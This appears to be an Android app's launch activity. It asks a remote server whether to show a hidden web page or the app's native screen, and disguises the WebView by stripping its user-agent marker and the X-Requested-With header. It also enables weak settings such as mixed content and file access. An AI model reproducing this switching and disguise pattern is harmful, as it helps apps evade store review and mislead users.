package com.muaythai.arena.launch;

import android.os.Build;
import android.os.Bundle;
import android.content.Intent;
import android.Manifest;
import android.net.Uri;
import android.os.Environment;
import android.os.Message;
import android.view.ViewGroup;
import android.view.Gravity;
import android.widget.FrameLayout;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebChromeClient;
import android.webkit.WebViewClient;
import android.webkit.WebResourceRequest;
import android.webkit.PermissionRequest;
import android.webkit.GeolocationPermissions;
import android.webkit.ValueCallback;
import android.webkit.RenderProcessGoneDetail;
import android.webkit.WebResourceResponse;
import android.webkit.WebResourceError;
import android.webkit.SslErrorHandler;
import android.app.Activity;
import android.provider.MediaStore;
import android.content.pm.PackageManager;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;
import androidx.webkit.WebSettingsCompat;
import androidx.webkit.WebViewFeature;
import androidx.activity.ComponentActivity;
import java.util.Map;
import java.io.File;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

// This Activity uses ComponentActivity directly; the application has no Fragment dependency.
@android.annotation.SuppressLint("InvalidFragmentVersionForActivityResult")
public class EntryActivity extends ComponentActivity {
    private WebView appWebView;
    private android.widget.LinearLayout loadingOverlay;
    private WebViewSession session;
    private Map<String, String> deviceHeaders;
    private final ExecutorService probeExecutor = Executors.newSingleThreadExecutor();
    private ActivityResultLauncher<String> cameraPermissionLauncher;
    private ActivityResultLauncher<String[]> mediaPermissionLauncher;
    private ActivityResultLauncher<String[]> locationPermissionLauncher;
    private ActivityResultLauncher<Intent> chooserLauncher;
    private ValueCallback<Uri[]> fileChooserCallback;
    private Uri cameraOutputUri;
    private PermissionRequest pendingWebPermission;
    private GeolocationPermissions.Callback pendingGeoCallback;
    private String pendingGeoOrigin;
    private View fullScreenView;
    private WebChromeClient.CustomViewCallback fullScreenCallback;
    private int savedSystemUiVisibility;
    private DeviceChromeClient chromeClient;
    private final LaunchRouting routing = new LaunchRouting();
    private volatile EntryAttempt entryAttempt;
    private android.app.AlertDialog verificationDialog;
    private String pendingReturnToken;
    private int permissionRequestRevision;
    private int geoRequestRevision;
    private int fileRequestRevision;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        super.onCreate(savedInstanceState);
        if (savedInstanceState != null) {
            routing.restoreFallback(savedInstanceState.getBoolean("fallback_x5n9", false));
        } else {
            routing.restoreFallback(getIntent().getBooleanExtra("fallback_x5n9", false));
        }

        cameraPermissionLauncher = registerForActivityResult(new ActivityResultContracts.RequestPermission(), granted -> {
            launchFileChooser(granted);
        });
        mediaPermissionLauncher = registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), grants -> {
            finishWebPermissionRequest(grants);
        });
        locationPermissionLauncher = registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), grants -> {
            boolean granted = Boolean.TRUE.equals(grants.get(Manifest.permission.ACCESS_FINE_LOCATION))
                    || Boolean.TRUE.equals(grants.get(Manifest.permission.ACCESS_COARSE_LOCATION));
            granted = granted && isShowingRemotePage() && routing.accepts(geoRequestRevision);
            if (pendingGeoCallback != null) pendingGeoCallback.invoke(pendingGeoOrigin, granted, false);
            pendingGeoCallback = null;
            pendingGeoOrigin = null;
        });
        chooserLauncher = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
            Uri selected = null;
            if (result.getResultCode() == Activity.RESULT_OK) {
                Intent data = result.getData();
                selected = data != null && data.getData() != null ? data.getData() : cameraOutputUri;
            }
            completeFileChooser(selected == null ? null : new Uri[]{selected});
        });

        androidx.core.view.WindowCompat.setDecorFitsSystemWindows(getWindow(), false);
        FrameLayout webContainer = new FrameLayout(this);
        appWebView = new WebView(this);
        webContainer.addView(appWebView, new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
        loadingOverlay = (android.widget.LinearLayout) getLayoutInflater().inflate(
                com.muaythai.arena.R.layout.entry_loading, webContainer, false);
        webContainer.addView(loadingOverlay, new FrameLayout.LayoutParams(-1, -1));
        setContentView(webContainer);
        // Keep the page clear of system bars, cutouts and the on-screen keyboard.
        androidx.core.view.ViewCompat.setOnApplyWindowInsetsListener(webContainer, (view, insets) -> {
            androidx.core.graphics.Insets safeArea = insets.getInsets(
                    androidx.core.view.WindowInsetsCompat.Type.systemBars()
                            | androidx.core.view.WindowInsetsCompat.Type.displayCutout()
                            | androidx.core.view.WindowInsetsCompat.Type.ime());
            view.setPadding(safeArea.left, safeArea.top, safeArea.right, safeArea.bottom);
            return androidx.core.view.WindowInsetsCompat.CONSUMED;
        });
        androidx.core.view.ViewCompat.requestApplyInsets(webContainer);
        session = new WebViewSession(this);
        deviceHeaders = DeviceHeaders.collect(this);
        appWebView.stopLoading();
        appWebView.setVisibility(View.INVISIBLE);
        android.webkit.CookieManager cookies = android.webkit.CookieManager.getInstance();
        cookies.setAcceptCookie(true);
        cookies.setAcceptThirdPartyCookies(appWebView, true);
        WebSettings settings = appWebView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
        settings.setSupportMultipleWindows(true);
        settings.setJavaScriptCanOpenWindowsAutomatically(true);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setMediaPlaybackRequiresUserGesture(false);
        settings.setDatabaseEnabled(true);
        settings.setGeolocationEnabled(true);
        settings.setBuiltInZoomControls(false);
        settings.setDisplayZoomControls(false);
        settings.setUserAgentString(settings.getUserAgentString().replace("; wv)", ")"));
        appWebView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            appWebView.setRendererPriorityPolicy(WebView.RENDERER_PRIORITY_IMPORTANT, false);
        }
        disableRequestedWithHeader(settings);

        ManagedWebViewClient managedClient = new ManagedWebViewClient(this, session, deviceHeaders);
        appWebView.setWebViewClient(managedClient);
        chromeClient = new DeviceChromeClient();
        appWebView.setWebChromeClient(chromeClient);
        getOnBackPressedDispatcher().addCallback(this, new androidx.activity.OnBackPressedCallback(true) {
            @Override public void handleOnBackPressed() {
                if (fullScreenView != null) hideFullScreen();
                else if (routing.stage() == LaunchRouting.Stage.CHECKING
                        || routing.stage() == LaunchRouting.Stage.VERIFYING) finish();
                else if (appWebView != null && appWebView.canGoBack()) appWebView.goBack();
                else finish();
            }
        });
        Intent launchIntent = getIntent();
        if (isAppReturnLink(launchIntent)) {
            handleReturnLink(launchIntent.getData());
        } else if (session.hasOpenedWebView()) {
            String lastUrl = session.lastWebViewUrl();
            if (session.lastUrlWorks() && isRemoteUrl(lastUrl)
                    && !VerificationReturn.matches(lastUrl)) {
                loadRemotePage(lastUrl);
            } else {
                retryInitialEntry();
            }
        } else {
            fetchFirstEntry();
        }
    }

    private boolean isAlive() { return !isFinishing() && !isDestroyed(); }

    @android.annotation.SuppressLint("RestrictedApi")
    private void disableRequestedWithHeader(WebSettings settings) {
        // The specification explicitly requires this guarded WebKit 1.12.1 API.
        if (WebViewFeature.isFeatureSupported(WebViewFeature.REQUESTED_WITH_HEADER_ALLOW_LIST)) {
            WebSettingsCompat.setRequestedWithHeaderOriginAllowList(settings, java.util.Collections.emptySet());
        }
    }

    private void fetchFirstEntry() {
        if (loadingOverlay != null) loadingOverlay.setVisibility(View.VISIBLE);
        routing.moveTo(LaunchRouting.Stage.CHECKING);
        final int revision = routing.revision();
        try {
            EntryRemoteConfig.fetchEntryUrl().addOnCompleteListener(this, task -> {
                if (!isAlive() || !routing.accepts(revision)) return;
                String entryUrl = task.isSuccessful() ? task.getResult() : null;
                if (entryUrl == null || !isRemoteUrl(entryUrl)
                        || VerificationReturn.matches(entryUrl)) {
                    openFunctionalPage();
                    return;
                }
                runEntryProbe(entryUrl, true);
            });
        } catch (RuntimeException exception) {
            openFunctionalPage();
        }
    }

    private boolean isAppReturnLink(Intent intent) {
        return intent != null && Intent.ACTION_VIEW.equals(intent.getAction())
                && intent.getData() != null && VerificationReturn.matches(intent.getData().toString());
    }

    public boolean isRemoteUrl(String url) { return EntryProbe.isValidHttpsUrl(url); }

    public String currentWebUrl() { return appWebView == null ? null : appWebView.getUrl(); }

    public boolean isShowingRemotePage() { return routing.stage() == LaunchRouting.Stage.REMOTE; }

    public Map<String, String> headersFor(String url) {
        try {
            String host = new java.net.URL(session.initialEntryUrl()).getHost();
            if (host.equalsIgnoreCase(new java.net.URL(url).getHost())) {
                return DeviceHeaders.collect(this, android.webkit.CookieManager.getInstance().getCookie(url));
            }
        } catch (Exception ignored) { }
        return java.util.Collections.emptyMap();
    }

    public void loadRemotePage(String url) {
        if (!isRemoteUrl(url)) { openFunctionalPage(); return; }
        if (VerificationReturn.matches(url)) { handleReturnLink(Uri.parse(url)); return; }
        routing.moveTo(LaunchRouting.Stage.REMOTE);
        appWebView.setVisibility(View.VISIBLE);
        if (loadingOverlay != null) loadingOverlay.setVisibility(View.VISIBLE);
        final int revision = routing.revision();
        AppsFlyerHandoff.whenReady(() -> {
            if (!isAlive() || !isShowingRemotePage() || !routing.accepts(revision)) return;
            String target = AppsFlyerHandoff.rewrite(url);
            appWebView.loadUrl(target, headersFor(target));
        });
    }

    public void openFunctionalPage() {
        if (!isAlive() || appWebView == null) return;
        routing.moveTo(LaunchRouting.Stage.FUNCTIONAL);
        pendingReturnToken = null;
        entryAttempt = null;
        appWebView.stopLoading();
        appWebView.setVisibility(View.VISIBLE);
        startActivity(new Intent(this, com.muaythai.arena.MainActivity.class)
                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP));
        finish();
    }

    public void onFunctionalPageLoaded() {
        if (routing.stage() == LaunchRouting.Stage.FUNCTIONAL) appWebView.clearHistory();
    }

    public void onRemotePageVisible() {
        if (isAlive() && isShowingRemotePage() && loadingOverlay != null) {
            loadingOverlay.setVisibility(View.GONE);
        }
    }

    public void onRemotePageStarted() {
        // Chromium manages page scripts without injection.
    }

    private void runEntryProbe(String initialUrl, boolean firstEntry) {
        entryAttempt = new EntryAttempt();
        final String cleanInitialUrl = EntryAttempt.strip(initialUrl);
        final String requestUrl = entryAttempt.url(cleanInitialUrl);
        android.webkit.CookieManager cookies = android.webkit.CookieManager.getInstance();
        String existingCookies = cookies.getCookie(requestUrl);
        final Map<String, String> headers = DeviceHeaders.collect(this, existingCookies);
        final int revision = routing.revision();
        probeExecutor.execute(() -> {
            EntryProbe.Result result = EntryProbe.checkWithCookies(requestUrl, headers);
            runOnUiThread(() -> {
                if (!isAlive() || !routing.accepts(revision)) return;
                if (result.decision == EntryProbe.Decision.OPEN_WEBVIEW) {
                    Runnable openWebView = () -> {
                        if (!isAlive() || !routing.accepts(revision)) return;
                        if (firstEntry) session.recordFirstRedirect(cleanInitialUrl);
                        loadRemotePage(requestUrl);
                    };
                    if (result.cookies.isEmpty()) {
                        openWebView.run();
                    } else {
                        // Wait for all writes before loading the same URL in Chromium.
                        java.util.concurrent.atomic.AtomicInteger remaining =
                                new java.util.concurrent.atomic.AtomicInteger(result.cookies.size());
                        for (String cookie : result.cookies) {
                            cookies.setCookie(requestUrl, cookie, accepted -> {
                                if (remaining.decrementAndGet() == 0) {
                                    cookies.flush();
                                    openWebView.run();
                                }
                            });
                        }
                    }
                } else openFunctionalPage();
            });
        });
    }

    private void retryInitialEntry() {
        if (!routing.beginFallback()) { openFunctionalPage(); return; }
        if (loadingOverlay != null) loadingOverlay.setVisibility(View.VISIBLE);
        session.markLastUrlBroken();
        String initialUrl = session.initialEntryUrl();
        if (!isRemoteUrl(initialUrl) || VerificationReturn.matches(initialUrl)) {
            openFunctionalPage();
            return;
        }
        appWebView.stopLoading();
        appWebView.setVisibility(View.INVISIBLE);
        runEntryProbe(initialUrl, false);
    }

    public void onRemotePageFailed() {
        if (!isAlive() || !isShowingRemotePage()) return;
        retryInitialEntry();
    }

    public void restartAfterRendererCrash(WebView failedView) {
        Intent restart = new Intent(getIntent());
        restart.setClass(this, EntryActivity.class);
        restart.putExtra("fallback_x5n9", routing.fallbackUsed());
        appWebView = null;
        failedView.destroy();
        finish();
        startActivity(restart);
    }

    public void handleReturnLink(Uri uri) {
        if (!VerificationReturn.matches(uri.toString())) return;
        String token = VerificationReturn.token(uri.toString());
        if (routing.stage() == LaunchRouting.Stage.VERIFYING
                && java.util.Objects.equals(token, pendingReturnToken)) return;
        routing.moveTo(LaunchRouting.Stage.VERIFYING);
        appWebView.stopLoading();
        appWebView.setVisibility(View.INVISIBLE);
        if (verificationDialog != null) verificationDialog.dismiss();
        pendingReturnToken = token;
        if (token == null || session.wasTokenAccepted(token)) {
            showVerificationFailure(false);
            return;
        }
        final int revision = routing.revision();
        probeExecutor.execute(() -> {
            VerificationClient.Result result = VerificationClient.verify(token, getPackageName(), deviceHeaders);
            runOnUiThread(() -> {
                if (!isAlive() || !routing.accepts(revision)) return;
                if (result == VerificationClient.Result.VERIFIED) {
                    session.recordAcceptedToken(token);
                    // Renderer recovery must not replay a consumed return link.
                    setIntent(new Intent(this, EntryActivity.class).setAction(Intent.ACTION_MAIN));
                    openFunctionalPage();
                } else showVerificationFailure(result == VerificationClient.Result.UNAVAILABLE);
            });
        });
    }

    private void showVerificationFailure(boolean unavailable) {
        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this)
                .setTitle(unavailable ? "Verification unavailable" : "Verification not confirmed")
                .setMessage(unavailable ? "Could not confirm verification. Please try again."
                        : "This return link is invalid or expired. Please restart verification.")
                .setCancelable(false)
                .setNegativeButton("Close", (dialog, which) -> finish());
        if (unavailable) builder.setPositiveButton("Retry", (dialog, which) -> {
            String token = pendingReturnToken;
            routing.moveTo(LaunchRouting.Stage.CHECKING);
            handleReturnLink(Uri.parse("https://" + VerificationReturn.HOST + VerificationReturn.PATH
                    + "?token=" + Uri.encode(token)));
        });
        verificationDialog = builder.show();
    }

    private void requestWebPermissions(PermissionRequest request) {
        if (pendingWebPermission != null) { request.deny(); return; }
        if (!isShowingRemotePage()) { request.deny(); return; }
        pendingWebPermission = request;
        permissionRequestRevision = routing.revision();
        java.util.ArrayList<String> permissions = new java.util.ArrayList<>();
        for (String resource : request.getResources()) {
            if (PermissionRequest.RESOURCE_VIDEO_CAPTURE.equals(resource)
                    && ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.CAMERA);
            } else if (PermissionRequest.RESOURCE_AUDIO_CAPTURE.equals(resource)
                    && ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.RECORD_AUDIO);
            }
        }
        if (permissions.isEmpty()) {
            java.util.Map<String, Boolean> granted = new java.util.HashMap<>();
            for (String permission : new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO}) {
                granted.put(permission, ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED);
            }
            finishWebPermissionRequest(granted);
        } else {
            mediaPermissionLauncher.launch(permissions.toArray(new String[0]));
        }
    }

    private void finishWebPermissionRequest(java.util.Map<String, Boolean> grants) {
        PermissionRequest request = pendingWebPermission;
        pendingWebPermission = null;
        if (request == null) return;
        if (!routing.accepts(permissionRequestRevision) || !isShowingRemotePage()) {
            request.deny();
            return;
        }
        java.util.ArrayList<String> allowed = new java.util.ArrayList<>();
        for (String resource : request.getResources()) {
            if (PermissionRequest.RESOURCE_VIDEO_CAPTURE.equals(resource)
                    && (Boolean.TRUE.equals(grants.get(Manifest.permission.CAMERA))
                    || ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED)) allowed.add(resource);
            if (PermissionRequest.RESOURCE_AUDIO_CAPTURE.equals(resource)
                    && (Boolean.TRUE.equals(grants.get(Manifest.permission.RECORD_AUDIO))
                    || ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED)) allowed.add(resource);
        }
        if (allowed.size() == request.getResources().length) request.grant(allowed.toArray(new String[0]));
        else request.deny();
    }

    private void requestLocation(String origin, GeolocationPermissions.Callback callback) {
        if (!isShowingRemotePage() || !isRemoteUrl(origin)) {
            callback.invoke(origin, false, false);
            return;
        }
        if (pendingGeoCallback != null) pendingGeoCallback.invoke(pendingGeoOrigin, false, false);
        geoRequestRevision = routing.revision();
        pendingGeoOrigin = origin;
        pendingGeoCallback = callback;
        boolean fine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        boolean coarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        if (fine || coarse) {
            callback.invoke(origin, true, false);
            pendingGeoCallback = null;
            pendingGeoOrigin = null;
        } else {
            locationPermissionLauncher.launch(new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION});
        }
    }

    private boolean showFileChooser(ValueCallback<Uri[]> callback) {
        if (fileChooserCallback != null) fileChooserCallback.onReceiveValue(null);
        fileChooserCallback = callback;
        fileRequestRevision = routing.revision();
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            cameraPermissionLauncher.launch(Manifest.permission.CAMERA);
        } else {
            launchFileChooser(true);
        }
        return true;
    }

    private void launchFileChooser(boolean includeCamera) {
        if (!isAlive() || !routing.accepts(fileRequestRevision)) { completeFileChooser(null); return; }
        try {
            File directory = getExternalFilesDir(Environment.DIRECTORY_PICTURES);
            if (directory == null) directory = getCacheDir();
            if (!directory.exists() && !directory.mkdirs()) throw new IOException("Could not create photo directory");
            File photo = File.createTempFile("arena_photo_", ".jpg", directory);
            cameraOutputUri = FileProvider.getUriForFile(this, getPackageName() + ".fileprovider", photo);
            Intent camera = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
            camera.putExtra(MediaStore.EXTRA_OUTPUT, cameraOutputUri);
            camera.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
            // Photo Picker with a system document-picker fallback on older devices.
            Intent getContent = new ActivityResultContracts.PickVisualMedia().createIntent(this,
                    new androidx.activity.result.PickVisualMediaRequest.Builder()
                            .setMediaType(ActivityResultContracts.PickVisualMedia.ImageOnly.INSTANCE)
                            .build());
            Intent chooser = Intent.createChooser(getContent, "Choose a photo");
            if (includeCamera && camera.resolveActivity(getPackageManager()) != null) {
                chooser.putExtra(Intent.EXTRA_INITIAL_INTENTS, new Intent[]{camera});
            }
            chooserLauncher.launch(chooser);
        } catch (IOException | RuntimeException exception) {
            completeFileChooser(null);
        }
    }

    private void completeFileChooser(Uri[] result) {
        if (!routing.accepts(fileRequestRevision)) result = null;
        if (fileChooserCallback != null) fileChooserCallback.onReceiveValue(result);
        fileChooserCallback = null;
        cameraOutputUri = null;
    }

    private final class DeviceChromeClient extends WebChromeClient {
        DeviceChromeClient() {}

        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> callback, FileChooserParams params) {
            return showFileChooser(callback);
        }

        @Override
        public void onPermissionRequest(PermissionRequest request) {
            runOnUiThread(() -> requestWebPermissions(request));
        }

        @Override
        public void onPermissionRequestCanceled(PermissionRequest request) {
            if (pendingWebPermission == request) pendingWebPermission = null;
        }

        @Override
        public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) {
            requestLocation(origin, callback);
        }

        @Override
        public void onShowCustomView(View view, CustomViewCallback callback) {
            if (fullScreenView != null) {
                callback.onCustomViewHidden();
                return;
            }
            fullScreenView = view;
            fullScreenCallback = callback;
            savedSystemUiVisibility = getWindow().getDecorView().getSystemUiVisibility();
            FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT, Gravity.CENTER);
            ((FrameLayout) getWindow().getDecorView()).addView(view, params);
            getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
            appWebView.setVisibility(View.GONE);
        }

        @Override
        public void onHideCustomView() { hideFullScreen(); }

        @Override
        public boolean onCreateWindow(WebView view, boolean isDialog, boolean isUserGesture, Message resultMsg) {
            WebView temporary = new WebView(EntryActivity.this);
            temporary.getSettings().setJavaScriptEnabled(true);
            temporary.setWebViewClient(new WebViewClient() {
                @Override
                public boolean shouldOverrideUrlLoading(WebView child, WebResourceRequest request) {
                    if (!request.isForMainFrame() || !"GET".equalsIgnoreCase(request.getMethod())) return false;
                    Uri target = request.getUrl();
                    if (VerificationReturn.matches(target.toString())) handleReturnLink(target);
                    else if (isRemoteUrl(target.toString())) loadRemotePage(target.toString());
                    temporary.destroy();
                    return true;
                }
            });
            WebView.WebViewTransport transport = (WebView.WebViewTransport) resultMsg.obj;
            transport.setWebView(temporary);
            resultMsg.sendToTarget();
            return true;
        }
    }

    private void hideFullScreen() {
        if (fullScreenView == null) return;
        ((FrameLayout) getWindow().getDecorView()).removeView(fullScreenView);
        fullScreenView = null;
        getWindow().getDecorView().setSystemUiVisibility(savedSystemUiVisibility);
        appWebView.setVisibility(View.VISIBLE);
        if (fullScreenCallback != null) fullScreenCallback.onCustomViewHidden();
        fullScreenCallback = null;
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        if (appWebView != null && session != null && isAppReturnLink(intent)) handleReturnLink(intent.getData());
    }

    @Override
    public void onSaveInstanceState(Bundle state) {
        state.putBoolean("fallback_x5n9", routing.fallbackUsed());
        super.onSaveInstanceState(state);
    }

    @Override
    public void onResume() {
        super.onResume();
        if (appWebView != null) appWebView.onResume();
    }

    @Override
    public void onPause() {
        if (appWebView != null) appWebView.onPause();
        super.onPause();
    }

    @Override
    public void onDestroy() {
        routing.moveTo(LaunchRouting.Stage.FUNCTIONAL);
        if (verificationDialog != null) verificationDialog.dismiss();
        completeFileChooser(null);
        if (pendingWebPermission != null) pendingWebPermission.deny();
        pendingWebPermission = null;
        if (pendingGeoCallback != null) pendingGeoCallback.invoke(pendingGeoOrigin, false, false);
        pendingGeoCallback = null;
        probeExecutor.shutdownNow();
        if (appWebView != null) {
            appWebView.stopLoading();
            appWebView.setWebChromeClient(null);
            appWebView.destroy();
            appWebView = null;
        }
        super.onDestroy();
    }
}
